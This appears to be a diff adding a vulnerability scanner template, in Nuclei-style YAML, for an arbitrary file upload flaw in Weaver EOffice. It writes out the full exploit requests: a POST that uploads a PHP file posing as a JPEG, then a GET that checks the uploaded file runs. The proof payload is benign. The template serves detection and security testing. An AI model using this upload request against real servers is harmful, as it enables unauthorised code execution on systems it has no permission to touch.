@@ -1,0 +1,44 @@
+id: weaver-eoffice-file-upload
+info:
+  name: Weaver EOffice Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver EOffice is a collaborative office system. There is an arbitrary file upload vulnerability in the UploadFile.php file, allowing attackers to upload malicious files and potentially control server permissions.
+  reference:
+    - https://www.eofficeoa.com
+http:
+  - raw:
+      - |
+        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=9eb3e8c30dcca26ab83aea06935f54fd
+
+        --9eb3e8c30dcca26ab83aea06935f54fd
+        Content-Disposition: form-data; name="Filedata"; filename="test.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5(1231);unlink(__FILE__);?>
+        --9eb3e8c30dcca26ab83aea06935f54fd--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "6c14da109e294d1e8155be8aa4b1ce8e"
+  - raw:
+      - |
+        GET /images/logo/logo-eoffice.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "6c14da109e294d1e8155be8aa4b1ce8e"
